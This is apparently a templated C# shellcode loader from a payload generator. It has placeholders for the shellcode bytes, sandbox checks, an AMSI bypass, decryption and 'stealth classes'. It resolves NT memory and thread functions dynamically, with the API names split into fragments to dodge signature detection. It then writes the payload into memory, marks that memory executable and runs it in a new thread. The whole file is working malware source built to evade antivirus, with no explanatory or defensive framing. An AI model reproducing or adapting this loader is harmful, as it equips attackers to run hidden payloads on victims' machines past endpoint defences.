using System;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;
{{ crypto_using }}

namespace {{ namespace }}
{
    class {{ classname }}
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint NtAlloc(IntPtr h, ref IntPtr a, IntPtr z, ref IntPtr s, uint t, uint p);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint NtProt(IntPtr h, ref IntPtr a, ref IntPtr s, uint p, out uint o);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint NtCreateThreadEx(out IntPtr h, uint a, IntPtr o, IntPtr p, IntPtr s, IntPtr pr, bool c, uint z, uint st, uint e, IntPtr t);

        static void Main(string[] args)
        {
{{ sandbox_block }}
{{ amsi_block }}
            byte[] {% if is_encrypted %}enc{% else %}buf{% endif %} = new byte[] { {{ shellcode }} };
{{ decrypt_block }}
            
            // Resolve NT functions via D/Invoke
            var _na = _mfd._mfg<NtAlloc>("nt" + "dll.dll", "NtAl" + "locateVi" + "rtualMe" + "mory");
            var _np = _mfd._mfg<NtProt>("nt" + "dll.dll", "NtPr" + "otectVi" + "rtualMe" + "mory");
            var _nt = _mfd._mfg<NtCreateThreadEx>("nt" + "dll.dll", "NtCr" + "eateThr" + "eadEx");

            IntPtr _h = (IntPtr)(-1);
            IntPtr _addr = IntPtr.Zero;
            IntPtr _size = (IntPtr)buf.Length;

            _na(_h, ref _addr, IntPtr.Zero, ref _size, 0x3000, 0x04); // RW
            Marshal.Copy(buf, 0, _addr, buf.Length);

            uint _old;
            _np(_h, ref _addr, ref _size, 0x20, out _old); // RX

            IntPtr _ht;
            _nt(out _ht, 0x1FFFFF, IntPtr.Zero, _h, _addr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            
            _mfd._mfg<Action<IntPtr, uint>>("ker" + "nel32.dll", "Wait" + "ForSin" + "gleOb" + "ject")(_ht, 0xFFFFFFFF);
        }
    }

{{ stealth_classes }}
}
